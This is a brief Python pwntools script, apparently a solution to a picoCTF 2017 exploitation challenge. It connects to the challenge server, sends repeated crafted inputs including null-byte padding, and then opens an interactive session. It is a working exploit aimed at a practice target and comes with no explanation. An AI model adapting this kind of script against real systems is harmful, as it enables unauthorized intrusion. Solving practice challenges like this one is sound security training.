from pwn import *
context(os='linux', arch='amd64')

r = remote('shell2017.picoctf.com', 17069)
for i in range(11):
    r.recv(4096)
    r.send('u\n')
for i in range(11):
    r.recv(4096)
    r.send('\x00'*12+'\n')
for i in range(13):
    r.recv(4096)
    r.send('A\n')
r.interactive()
